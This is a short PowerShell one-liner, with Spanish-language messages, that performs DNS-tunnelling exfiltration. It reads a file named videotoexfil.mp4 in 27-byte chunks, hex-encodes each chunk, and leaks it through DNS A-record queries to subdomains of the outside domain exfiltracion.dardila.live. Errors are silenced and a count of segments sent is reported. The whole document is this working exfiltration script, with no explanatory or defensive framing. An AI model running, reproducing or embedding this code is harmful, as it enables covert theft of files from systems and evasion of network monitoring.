If (Test-Path “videotoexfil.mp4") {$i=0; get-content -encoding byte -readcount 27 -totalcount -1 “videotoexfil.mp4” | foreach-object {$paddedhex = $text = $null; $bytes = $_;foreach ($byte in $bytes){$byteinhex = [String]::Format("{0:X}", $byte);$paddedhex += $byteinhex.PadLeft(2,"0")};$req=$paddedhex+"."+$I+”.exfiltracion.dardila.live";$i++; $req; Resolve-DnsName -Type A -DnsOnly -QuickTimeout  $req -erroraction 'silentlycontinue'}; 'Segments sent: '+$i}Else{echo “Archivo No existe"}
